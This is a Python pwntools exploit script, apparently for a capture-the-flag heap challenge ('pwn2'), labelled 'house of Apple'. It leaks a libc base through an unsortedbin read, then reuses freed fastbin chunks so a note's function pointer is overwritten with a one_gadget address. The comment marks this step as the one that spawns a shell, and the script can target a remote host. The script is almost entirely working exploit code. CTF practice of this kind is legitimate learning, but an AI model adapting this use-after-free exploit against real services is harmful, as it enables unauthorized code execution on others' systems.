# house of Apple

from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else './pwn2'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sa(b'Your choice :', str(idx).encode())

def create(sz, content):
    opt(1)
    sa(b'size :', str(sz).encode())
    sa(b'Content :', content)

def edit():
    pass

def show(idx):
    opt(3)
    sa(b'Index :', str(idx).encode())

def delete(idx):
    opt(2)
    sa(b'Index :', str(idx).encode())

def exp():
    create(0x200, b'0. unsortedbin')
    create(0x40, b'1')
    create(0x40, b'2')
    
    main_arena = 0x3c4b20
    # leak glibc
    delete(0)
    # bpt()
    # pause()
    # before show(0) we need realloc it again, because after freeing note_blcok0, note_blco0.p2func = NULL
    create(0x200, b'a'*8)
    show(0)
    ru(b'a'*8)
    libc.address = u64(rl()[:-1].ljust(8, b'\0')) - main_arena - 88
    log.success('libc: %#x' % libc.address)
    
    # fastbin fengshui
    delete(1)
    delete(2)
    # now, fastbin[0x20]: note2->note1
    one_gadget = libc.address + 0x45226 # rax==0
    create(0x10, p64(one_gadget)) # note3: uses note2 as note_block, and note1 as content
    # pause()
    show(1) # get shell

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()